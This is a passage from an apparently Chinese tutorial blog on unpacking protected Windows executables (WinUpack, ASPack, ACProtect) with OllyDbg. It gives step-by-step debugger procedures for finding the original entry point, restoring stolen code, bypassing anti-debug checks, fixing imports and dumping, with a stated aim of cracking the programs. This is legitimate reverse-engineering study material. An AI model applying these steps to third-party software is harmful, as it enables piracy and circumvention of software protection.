使用IsDebuggerPresent</h3><p>在命令窗口输入<code>bp IsDebuggerPresent</code>回车，运行。取消断点，Alt+F9返回到用户代码处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040ED24    8BBD 013C4000   mov edi,dword ptr ss:[ebp+0x403C01]</span><br><span class="line">0040ED2A    03BD 273C4000   add edi,dword ptr ss:[ebp+0x403C27]      ; sticker.00400000</span><br></pre></td></tr></table></figure><p>F8执行到下一条指令，查看信息窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss:[0040A167]=00400000 (sticker.00400000), ASCII &quot;MZ0&quot;</span><br><span class="line">edi=0000535F</span><br></pre></td></tr></table></figure><p>基址为<code>400000</code>，偏移地址为<code>535F</code>，第二条指令就是要它俩相加，结果就是OEP=40535F</p><p>Ctrl+G去到40535F，F4运行至光标处，光标处即OEP。 </p><h2 id="4-9-WinUpack"><a href="#4-9-WinUpack" class="headerlink" title="4.9 WinUpack"></a>4.9 WinUpack</h2><p>用单步跟踪法跟踪到这一步，发现这是个大跳转，然而这个跳转却没有实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E</span><br></pre></td></tr></table></figure><p>不能直接改为jmp，因为如果这样改的话在Scylla获取输入表时一个函数都没有。</p><p>要让这个跳转实现，即eax要等于0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0043E633    85C0            test eax,eax                             ; 跑跑排行.0040C034</span><br><span class="line">0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E</span><br></pre></td></tr></table></figure><p>运行到跳转指令处，右键-&gt;断点-&gt;条件，输入<code>eax==0</code>。F9运行，取消断点，F8跳转至OEP。之后用③方法dump即可。</p><h2 id="4-10-脱壳的基本思路及小结"><a href="#4-10-脱壳的基本思路及小结" class="headerlink" title="4.10 脱壳的基本思路及小结"></a>4.10 脱壳的基本思路及小结</h2><p>还有非常多的我们没见过的壳，比如KByS、RLPack、PEpack、JDPack、PEncrypt等。但基本都可以用以下几种办法解决：</p><ol><li>单步跟踪</li><li>ESP定律</li><li>2次内存镜像</li><li>最后一次异常法</li><li>模拟跟踪法</li><li>SFX模拟跟踪</li></ol><p>压缩壳修不修正无所谓，但加密壳一定要修正镜像大小。</p><p>如果脱壳后的程序无法运行，可能是IAT重定位的问题，无效指针的问题，需要重建PE的问题，包括5的疑难杂症等等。这需要慢慢探索吧。</p><h2 id="4-11-ASPack变形壳"><a href="#4-11-ASPack变形壳" class="headerlink" title="4.11 ASPack变形壳"></a>4.11 ASPack变形壳</h2><p>使用单步跟踪法、2次内存镜像法可以，但ESP定律不行。</p><p>另外，对任何壳，短距离call要跟进去，远距离call可以不跟进去。</p><h3 id="4-11-1-利用脚本进行脱壳"><a href="#4-11-1-利用脚本进行脱壳" class="headerlink" title="4.11.1 利用脚本进行脱壳"></a>4.11.1 利用脚本进行脱壳</h3><p>载入加壳程序后，插件-&gt;ODdgScript-&gt;运行脚本-&gt;打开对应的壳脚本(后缀可以为txt/osc)，自动找到程序OEP。</p><p>脱壳脚本要自己收集，如果遇到一些变形壳，脱壳脚本可能就太不管用了，在运行了脱壳脚本的基础上再单步跟踪到OEP。</p><h2 id="4-12-ACProtect"><a href="#4-12-ACProtect" class="headerlink" title="4.12 ACProtect"></a>4.12 ACProtect</h2><h3 id="4-12-1-ACProtect-1-32"><a href="#4-12-1-ACProtect-1-32" class="headerlink" title="4.12.1 ACProtect 1.32"></a>4.12.1 ACProtect 1.32</h3><p>ACProtect 1.32是没有Stolen Code的，脱壳相对简单。</p><p>Stolen Code的意思是把被保护程序要运行的代码移走，以进行进一步的保护处理。增加分析难度，脱壳难度、增加反跟踪难度等等。 </p><img src="/posts/e2d652c5/ACProtect132.png" class="" title="ACProtect1.32"><p>运行一下程序，发现会弹一个ACProtect壳的NAG窗口，再进入到主程序。</p><p>载入OD，选项-&gt;调试设置-&gt;异常-&gt;将非法访问内存取消勾选，插件-&gt;SrtongOD-&gt;options-&gt;将skip some exceptions取消勾选。用最后一次异常法，发现它在第2次Shift+F9跑飞了。所以在第1次Shift+F9(如果第一次就跑飞的话用F9)后，选中堆栈窗口的<code>SE处理程序</code>右键-&gt;数据窗口中跟随，在数据窗口中的第一个字节下一个内存访问断点，Shift+F9运行。在反汇编窗口下断点，Shift+F9，再次下断点，Shift+F9。在<code>B</code>模块取消软件断点。如何删除内存访问断点呢？直接右键-&gt;断点-&gt;删除内存断点即可。去到<code>M</code>模块，选中程序领空的<code>.text</code>区段右键-&gt;在访问上设置中断，Shift+F9，弹出NAG窗口，点确定后直达OEP。</p><p>用importREC修复IAT，Scylla会加载出非常多无效指针。</p><h3 id="4-12-2-Ultraprotect-1-x-stolen-code"><a href="#4-12-2-Ultraprotect-1-x-stolen-code" class="headerlink" title="4.12.2 Ultraprotect 1.x(stolen code)"></a>4.12.2 Ultraprotect 1.x(stolen code)</h3><p>查壳显示Ultraprotect壳，这是ACProtect以前的名字，EP区段都显示<code>.perplex</code>。</p><p>这次运行没有NAG窗口。与上述操作一致，到达“OEP”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004010D2    56              push esi</span><br><span class="line">004010D3    FF15 E4634000   call dword ptr ds:[0x4063E4]             ; notepad9.0040D1BA</span><br></pre></td></tr></table></figure><p>这“OEP”长得非常奇怪，与我们之前遇到的语言入口特征都不一样。考虑到ACProtect会有偷代码的习惯，所以猜测入口特征被移到了某处。</p><p>入口特征最常见的是<code>push ebp</code>，先用这个试一下。</p><p>同样，删除完3个断点后，F4运行至目前函数的<code>retn</code>处。调试-&gt;设置条件(Ctrl+T)，勾选“命令是一个”，在输入框填写“push ebp”。调试-&gt;跟踪步入(Ctrl+F11)，跟踪需要亿点时间，跟踪完后会跳到某个指令处，刚好就是被偷的入口特征代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004254C9    55              push ebp</span><br><span class="line">004254CA    8BEC            mov ebp,esp</span><br><span class="line">004254CC    83EC 44         sub esp,0x44</span><br><span class="line">004254CF    60              pushad</span><br><span class="line">004254D0    60              pushad</span><br></pre></td></tr></table></figure><p>后面几个是出栈指令，所以被偷的代码应该是前3条。选中右键-&gt;二进制-&gt;二进制复制。同样在<code>M</code>模块的<code>.text</code>下断点，Shift+F9运行至“OEP”。由于前3条指令占6个字节，所以要粘贴在“OEP”前6个字节处(粘贴前要把粘贴的地方的指令先nop掉)。覆盖后代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004010CA    90              nop</span><br><span class="line">004010CB    90              nop</span><br><span class="line">004010CC    55              push ebp</span><br><span class="line">004010CD    8BEC            mov ebp,esp</span><br><span class="line">004010CF    83EC 44         sub esp,0x44</span><br><span class="line">004010D2    56              push esi</span><br></pre></td></tr></table></figure><p>选中真正的OEP右键-&gt;此处为新EIP。接下来就是脱壳了。如果遇到很多无效函数，可以用插件跟踪-&gt;ACProtect，也可以用跟踪级别跟踪(注意OD进程跟踪会卡死，所以打开加壳程序跟踪)。</p><h3 id="4-12-3-Ultraprotect-1-x进阶版"><a href="#4-12-3-Ultraprotect-1-x进阶版" class="headerlink" title="4.12.3 Ultraprotect 1.x进阶版"></a>4.12.3 Ultraprotect 1.x进阶版</h3><p>用4.12.2的方法到了跟踪那一步会报错，“无法处理调试异常”。这时，将选项-&gt;调试设置-&gt;异常-&gt;将INT3中断取消勾选，其余勾选。重载，同样用最后一次异常法，取消3个断点后，在命令窗口输入<code>d 12ffc0</code>回车，下硬件访问断点，Shift+F9。程序找到Stolen Code。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004C9B30    61              popad</span><br><span class="line">004C9B31    55              push ebp</span><br><span class="line">004C9B32    8BEC            mov ebp,esp</span><br><span class="line">004C9B34    6A FF           push -0x1</span><br></pre></td></tr></table></figure><p>复制，找到“OEP”往上滑，却发现代码全乱了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004431F9    68 D8B24400     push NetClean.0044B2D8</span><br><span class="line">004431FE    68 B4334400     push NetClean.004433B4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004431F7   /2e:79 68        bhnt jns short 00443262</span><br><span class="line">004431FA   |D8B2 440068B4   fdiv dword ptr ds:[edx-0x4B97FFBC]</span><br><span class="line">00443200   |334400 64       xor eax,dword ptr ds:[eax+eax+0x64]</span><br></pre></td></tr></table></figure><p>去一下别的模块再回来，发现又好了，就是不能向上滑动。右键-&gt;分析-&gt;分析代码。这时往上滑正常。将被偷的代码粘贴上去，修改EIP。</p><p>脱壳，运行程序异常。这是因为某些ACProtect 1.x壳有自我保护功能，即入口点如果不是原本那个地址可能就运行不了了。加壳程序入口点<code>4AC000</code>。将已脱壳程序载入OD，定位到<code>4AC000</code>，将被偷代码粘贴，再跳到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004AC000    55              push ebp</span><br><span class="line">004AC001    8BEC            mov ebp,esp</span><br><span class="line">004AC003    6A FF           push -0x1</span><br><span class="line">004AC005  - E9 EA71B9FF     jmp 004431F4</span><br><span class="line">;jmp 4431F4也可改为push 4431F4, retn</span><br></pre></td></tr></table></figure><p>复制到可执行文件。再用LoadPE编辑入口点为<code>AC000</code>，程序正常执行。</p><h3 id="4-12-4-ACProtect-2-0-x"><a href="#4-12-4-ACProtect-2-0-x" class="headerlink" title="4.12.4 ACProtect 2.0.x"></a>4.12.4 ACProtect 2.0.x</h3><h4 id="4-12-4-1-VB类"><a href="#4-12-4-1-VB类" class="headerlink" title="4.12.4.1 VB类"></a>4.12.4.1 VB类</h4><p>用4.12.1方法直接到达“OEP”<code>4012CE</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain</span><br><span class="line">004012D4    29BA A821B144   sub dword ptr ds:[edx+0x44B121A8],edi</span><br><span class="line">004012DA    BC 4DB59200     mov esp,0x92B54D</span><br><span class="line">004012DF    0000            add byte ptr ds:[eax],al</span><br><span class="line">004012E1    0000            add byte ptr ds:[eax],al</span><br></pre></td></tr></table></figure><p>根据语言的编译特点，发现它是VB程序。以下就是VB程序的典型例子。第一条指令<code>push</code>，第二条指令<code>call</code>，双击call指令就可知道call的地址<code>call 00401044</code>，刚好是OEP的上面一条<code>jmp 系统函数</code>指令。运行到这条jmp指令时，堆栈窗口的第二条就是push的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401044   $- FF25 18104000 jmp dword ptr ds:[&lt;&amp;MSVBVM60.#ThunRTMain_100&gt;]     ;  msvbvm60.ThunRTMain</span><br><span class="line">0040104A   ?  0000          add byte ptr ds:[eax],al</span><br><span class="line">0040104C &gt; $  68 3C1F4000   push 吾爱破解.00401F3C                                 ;  ASCII &quot;VB5!#vb6chs.dll&quot;OEP</span><br><span class="line">00401051   .  E8 EEFFFFFF   call &lt;jmp.&amp;MSVBVM60.#ThunRTMain_100&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0012FFBC   00401056  返回到 吾爱破解.00401056 来自 &lt;jmp.&amp;MSVBVM60.#ThunRTMain_100&gt;</span><br><span class="line">0012FFC0   00401F3C  ASCII &quot;VB5!#vb6chs.dll&quot;</span><br></pre></td></tr></table></figure><p>模仿典型例子修改代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">004012CE  - FF25 78104000   jmp dword ptr ds:[0x401078]              ; msvbvm60.ThunRTMain</span><br><span class="line">004012D4    68 54474000     push QQ个性签.00404754</span><br><span class="line">004012D9    E8 F0FFFFFF     call QQ个性签.004012CE                      ; jmp 到 msvbvm60.ThunRTMain</span><br></pre></td></tr></table></figure><p>在真正OEP<code>4012D4</code>处右键-&gt;此处为新EIP，脱壳。</p><h4 id="4-12-4-2-Delphi"><a href="#4-12-4-2-Delphi" class="headerlink" title="4.12.4.2 Delphi"></a>4.12.4.2 Delphi</h4><p>这次的壳发现取消勾选“非内存访问”或“INT3”或两个都取消，都直接跑飞。换方法。</p><p>在命令窗口输入<code>bp GetCurrentProcessId</code>回车，运行，取消断点。用LoadPE查看程序的PID为<code>8C8</code>(每次都会变)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7C8099C0 &gt;  64:A1 18000000  mov eax,dword ptr fs:[0x18]</span><br><span class="line">7C8099C6    8B40 20         mov eax,dword ptr ds:[eax+0x20]          ; comctl_1.&lt;ModuleEntryPoint&gt;</span><br><span class="line">7C8099C9    C3              retn</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">7C8099C0 &gt;  B8 64050000     mov eax,0x564</span><br><span class="line">7C8099C5    90              nop</span><br><span class="line">7C8099C6    90              nop</span><br><span class="line">7C8099C7    90              nop</span><br><span class="line">7C8099C8    90              nop</span><br><span class="line">7C8099C9    C3              retn</span><br></pre></td></tr></table></figure><p>光标处修改为PID，下面指令都nop掉。</p><p>在命令窗口输入<code>bp GetModuleHandleA</code>回车，运行，取消断点。去到<code>M</code>模块，在CODE设置访问中断(F2)，F9运行，出现NAG窗口，点确定后，来到OEP。</p><h3 id="4-12-5-另类方法解ACProtect"><a href="#4-12-5-另类方法解ACProtect" class="headerlink" title="4.12.5 另类方法解ACProtect"></a>4.12.5 另类方法解ACProtect</h3><p>ACProtect 1.4x</p><p>取消勾选“非法内存访问”和“int3中断”都跑飞。用4.12.4.2方法找到“OEP”。用4.12.2寻找Stolen Code跟踪时间太过漫长，可以用另一种办法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0040A54C    50              push eax                                 ; 跑跑排行.00400000</span><br><span class="line">0040A54D    E8 1B030000     call 跑跑排行.0040A86D</span><br><span class="line">0040A552    8945 98         mov dword ptr ss:[ebp-0x68],eax          ; 跑跑排行.00400000</span><br></pre></td></tr></table></figure><p>重载，看到有<code>pushad</code>，试一下用ESP定律，硬件断点先别删除，再用最后一次异常法。Shift+F9连续13次到达最佳脱壳地点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00441E4D    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00441E53    8905 39CA4200   mov dword ptr ds:[0x42CA39],eax</span><br><span class="line">00441E59    FF35 39CA4200   push dword ptr ds:[0x42CA39]</span><br></pre></td></tr></table></figure><p>但是脱壳却说这个位置没有函数。在importREC先填写OEP为<code>A54C</code>，获取输入表修复IAT后，再将OEP改为<code>41E4D</code>，转储到文件。</p><p>程序正常运行，查壳说还有壳，但已经可以进行破解美化DIY了。</p><h3 id="4-12-6-补区段"><a href="#4-12-6-补区段" class="headerlink" title="4.12.6 补区段"></a>4.12.6 补区段</h3><p>ACProtect壳会对<code>MessageBoxA</code>和<code>ReigisterHotKey</code>进行处理，所以我们要在它进行处理的地方nop掉不让它处理。</p><p>将所有忽略异常勾选，在<code>M</code>模块的<code>.rdata</code>处下断运行(没有<code>.rdata</code>用<code>.idata</code>)。单步跟踪看注释窗口出现这两个API函数，把它下面的跳转指令nop掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0043396D    3B85 9CE24100   cmp eax,dword ptr ss:[ebp+0x41E29C]      ; user32.MessageBoxA</span><br><span class="line">00433973    74 20           je short NgaMy.00433995;nop</span><br><span class="line">00433975    90              nop</span><br><span class="line">00433976    90              nop</span><br><span class="line">00433977    90              nop</span><br><span class="line">00433978    90              nop</span><br><span class="line">00433979    3B85 9D014100   cmp eax,dword ptr ss:[ebp+0x41019D]      ; user32.RegisterHotKey</span><br><span class="line">0043397F    74 09           je short NgaMy.0043398A;nop</span><br></pre></td></tr></table></figure><p>再继续往下有magic跳，改JMP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004339C0    80BD D2594100 0&gt;cmp byte ptr ss:[ebp+0x4159D2],0x0</span><br><span class="line">004339C7    74 57           je short NgaMy.00433A20;jmp</span><br></pre></td></tr></table></figure><p>在<code>M</code>模块的<code>.text</code>下访问中断，Shift+F9运行到此处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00403D38    68 8C3D4000     push NgaMy.00403D8C</span><br><span class="line">00403D3D    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00403D43    50              push eax</span><br><span class="line">00403D44    8B4424 10       mov eax,dword ptr ss:[esp+0x10]</span><br><span class="line">00403D48    896C24 10       mov dword ptr ss:[esp+0x10],ebp</span><br><span class="line">00403D4C    8D6C24 10       lea ebp,dword ptr ss:[esp+0x10]</span><br><span class="line">00403D50    2BE0            sub esp,eax</span><br><span class="line">00403D52    53              push ebx</span><br><span class="line">00403D53    56              push esi</span><br><span class="line">00403D54    57              push edi</span><br><span class="line">00403D55    8B45 F8         mov eax,dword ptr ss:[ebp-0x8]           ; kernel32.7C817080</span><br><span class="line">00403D58    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00403D5B    50              push eax</span><br><span class="line">00403D5C    8B45 FC         mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">00403D5F    C745 FC FFFFFFF&gt;mov dword ptr ss:[ebp-0x4],-0x1</span><br><span class="line">00403D66    8945 F8         mov dword ptr ss:[ebp-0x8],eax</span><br><span class="line">00403D69    8D45 F0         lea eax,dword ptr ss:[ebp-0x10]</span><br><span class="line">00403D6C    64:A3 00000000  mov dword ptr fs:[0],eax</span><br><span class="line">00403D72    C3              retn</span><br></pre></td></tr></table></figure><p>F4去到<code>retn</code>处，F8返回父函数。再去到<code>M</code>模块<code>.text</code>设置内存访问断点运行，F4去到<code>retn</code>处，F8返回父函数。再去到<code>M</code>模块<code>.text</code>设置内存访问断点运行，F4去到<code>retn</code>处，F8返回父函数。到达“OEP”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040305C    83F9 02         cmp ecx,0x2</span><br><span class="line">0040305F    74 0C           je short NgaMy.0040306D</span><br><span class="line">00403061    81CE 00800000   or esi,0x8000</span><br><span class="line">00403067    8935 B0DE4000   mov dword ptr ds:[0x40DEB0],esi</span><br></pre></td></tr></table></figure><p>用Scylla脱壳(因为用PEtools和LoadPE脱都显示错误)，在importREC输入偏移地址，自动获取输入表没有函数，自己手动查找IAT，起始地址A000，大小174。</p><p>下一步，加壳程序重载，用ESP定律。F9运行5次来到这里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">004365F4    8915 F5FD4100   mov dword ptr ds:[0x41FDF5],edx          ; ntdll.KiFastSystemCallRet</span><br><span class="line">004365FA    FF35 F5FD4100   push dword ptr ds:[0x41FDF5]</span><br><span class="line">00436600    8F05 2DFE4100   pop dword ptr ds:[0x41FE2D]              ; kernel32.7C817077</span><br><span class="line">00436606    FF35 2DFE4100   push dword ptr ds:[0x41FE2D]</span><br><span class="line">0043660C    C70424 60000000 mov dword ptr ss:[esp],0x60</span><br><span class="line">00436613    56              push esi</span><br><span class="line">00436614    890C24          mov dword ptr ss:[esp],ecx</span><br><span class="line">00436617    68 8DFD4100     push NgaMy.0041FD8D</span><br><span class="line">0043661C    59              pop ecx                                  ; kernel32.7C817077</span><br><span class="line">0043661D    8919            mov dword ptr ds:[ecx],ebx</span><br><span class="line">0043661F    8B0C24          mov ecx,dword ptr ss:[esp]               ; kernel32.7C817077</span><br><span class="line">00436622    8F05 ADFE4100   pop dword ptr ds:[0x41FEAD]              ; kernel32.7C817077</span><br><span class="line">00436628    FF35 8DFD4100   push dword ptr ds:[0x41FD8D]</span><br><span class="line">0043662E    C70424 48A24000 mov dword ptr ss:[esp],NgaMy.0040A248</span><br><span class="line">00436635    8905 B9FD4100   mov dword ptr ds:[0x41FDB9],eax</span><br><span class="line">0043663B    FF35 B9FD4100   push dword ptr ds:[0x41FDB9]</span><br><span class="line">00436641    90              nop</span><br><span class="line">00436642    90              nop</span><br><span class="line">00436643    60              pushad</span><br><span class="line">00436644    E8 01000000     call NgaMy.0043664A</span><br></pre></td></tr></table></figure><p>将<code>pushad</code>前的代码二进制复制下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56</span><br><span class="line">89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40</span><br><span class="line">00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00</span><br></pre></td></tr></table></figure><p>取消硬件断点，F4去到<code>pushad</code>的下一条指令，在寄存器窗口找ESP，继续用ESP定律。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">00436F16    68 1DFD4100     push NgaMy.0041FD1D</span><br><span class="line">00436F1B    58              pop eax</span><br><span class="line">00436F1C    8930            mov dword ptr ds:[eax],esi               ; NgaMy.00403D38</span><br><span class="line">00436F1E    8F05 79FC4100   pop dword ptr ds:[0x41FC79]</span><br><span class="line">00436F24    8B05 79FC4100   mov eax,dword ptr ds:[0x41FC79]</span><br><span class="line">00436F2A    FF35 1DFD4100   push dword ptr ds:[0x41FD1D]</span><br><span class="line">00436F30    56              push esi                                 ; NgaMy.00403D38</span><br><span class="line">00436F31    891C24          mov dword ptr ss:[esp],ebx</span><br><span class="line">00436F34    C70424 383D4000 mov dword ptr ss:[esp],NgaMy.00403D38</span><br><span class="line">00436F3B    8B3424          mov esi,dword ptr ss:[esp]</span><br><span class="line">00436F3E    8F05 A5FE4100   pop dword ptr ds:[0x41FEA5]              ; NgaMy.00403D38</span><br><span class="line">00436F44    8905 01FF4100   mov dword ptr ds:[0x41FF01],eax</span><br><span class="line">00436F4A    FF35 01FF4100   push dword ptr ds:[0x41FF01]</span><br><span class="line">00436F50    891C24          mov dword ptr ss:[esp],ebx</span><br><span class="line">00436F53    56              push esi                                 ; NgaMy.00403D38</span><br><span class="line">00436F54    C70424 45FE4100 mov dword ptr ss:[esp],NgaMy.0041FE45</span><br><span class="line">00436F5B    8F05 31FE4100   pop dword ptr ds:[0x41FE31]              ; NgaMy.0041FE45</span><br><span class="line">00436F61    90              nop</span><br><span class="line">00436F62    90              nop</span><br><span class="line">00436F63    60              pushad</span><br><span class="line">00436F64    E8 01000000     call NgaMy.00436F6A</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 00 FF 35 1D FD 41 00 56 89 1C 24 C7 04</span><br><span class="line">24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 00 FF 35 01 FF 41 00 89 1C 24 56 C7 04</span><br><span class="line">24 45 FE 41 00 8F 05 31 FE 41 00</span><br></pre></td></tr></table></figure><p>重复操作n次，到达OEP。</p><p>ESP有：12FFA4、12FF98、12FF94、12FF24、12FF1C、12FF20、12FF1C、12FF1C、12FE8C、12FE8C、12FE90。</p><p>在12FE90处下断点后运行到达jmp指令，F8去到一个大跳转，跳到“OEP”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0043BE77   /EB 01               jmp short NgaMy.0043BE7A  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0043BE7A  - FF25 BCBE4300   jmp dword ptr ds:[0x43BEBC]              ; NgaMy.0040305C</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040305C    83F9 02         cmp ecx,0x2</span><br><span class="line">0040305F    74 0C           je short NgaMy.0040306D</span><br></pre></td></tr></table></figure><p>二进制代码汇总：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">89 15 F5 FD 41 00 FF 35 F5 FD 41 00 8F 05 2D FE 41 00 FF 35 2D FE 41 00 C7 04 24 60 00 00 00 56</span><br><span class="line">89 0C 24 68 8D FD 41 00 59 89 19 8B 0C 24 8F 05 AD FE 41 00 FF 35 8D FD 41 00 C7 04 24 48 A2 40</span><br><span class="line">00 89 05 B9 FD 41 00 FF 35 B9 FD 41 00 68 1D FD 41 00 58 89 30 8F 05 79 FC 41 00 8B 05 79 FC 41 </span><br><span class="line">00 FF 35 1D FD 41 00 56 89 1C 24 C7 04 24 38 3D 40 00 8B 34 24 8F 05 A5 FE 41 00 89 05 01 FF 41 </span><br><span class="line">00 FF 35 01 FF 41 00 89 1C 24 56 C7 04 24 45 FE 41 00 8F 05 31 FE 41 00 8B 1D 31 FE 41 00 89 33 </span><br><span class="line">8F 05 39 FC 41 00 FF 35 39 FC 41 00 5B 8F 05 09 FE 41 00 89 1D 21 FC 41 00 FF 35 21 FC 41 00 C7 </span><br><span class="line">05 19 FC 41 00 09 FE 41 00 8B 1D 19 FC 41 00 8B 33 8F 05 FD FB 41 00 8B 1D FD FB 41 00 